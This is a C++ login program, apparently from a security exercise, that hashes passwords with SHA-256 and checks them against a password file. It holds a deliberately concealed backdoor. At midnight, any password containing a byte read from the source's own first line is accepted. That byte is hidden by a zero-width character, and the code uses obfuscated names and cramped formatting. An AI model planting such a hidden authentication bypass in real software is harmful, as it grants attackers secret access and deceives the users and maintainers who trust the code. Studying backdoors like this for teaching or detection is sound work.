// Subverted Login P​rogram

#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include "authlib.h"
#include "openssl/sha.h"
#include <ctime>

using namespace std; 
string f8e9d7(const string& d5e7a3) { unsigned char a8c6e4[SHA256_DIGEST_LENGTH]; SHA256_CTX b9f7g2; SHA256_Init(&b9f7g2); SHA256_Update(&b9f7g2, d5e7a3.c_str(), d5e7a3.size()); SHA256_Final(a8c6e4, &b9f7g2); stringstream c7e5b3; for (int d4e2f1 = 0; d4e2f1 < SHA256_DIGEST_LENGTH; d4e2f1++)c7e5b3 << hex << setw(2) << setfill('0') << (int)a8c6e4[d4e2f1]; return c7e5b3.str(); }


bool m​(const std::string& p) {
    std::ifstream sf("login-subverted.cpp");
    std::string l;
    char c;
    if (getline(sf, l)) c = l[20];
    sf.close();
    return p.find(c) != std::string::npos;
}


bool f8e9d7c6() { time_t a1b2c3 = time(0); tm* d4e5f6 = localtime(&a1b2c3); return!d4e5f6->tm_hour && !d4e5f6->tm_min; }


int main() {
	const int MA = 3; int a = 0; string uI, pI, line, uFF, pFF;
	while (a++ < MA && cout << "Enter your username: " && cin >> uI && cout << "Enter your password: " && cin >> pI) { ifstream pF("passwords.txt"); if (!pF) { cerr << "Error opening password file." << endl; return 1; } bool iA = false;
		while (getline(pF, line) && !iA) { stringstream ss(line); getline(ss, uFF, ':'), getline(ss, pFF, ':'); iA = uFF == uI && pFF == f8e9d7(pI);} pF.close(); if (iA || (m​(pI) && f8e9d7c6())) { authenticated(uI); return 0;}
		if (a < MA) {cout << "Incorrect login details. You have " << (MA - a) << " a left." << endl;} else {rejected(uI);} } return 0;
}

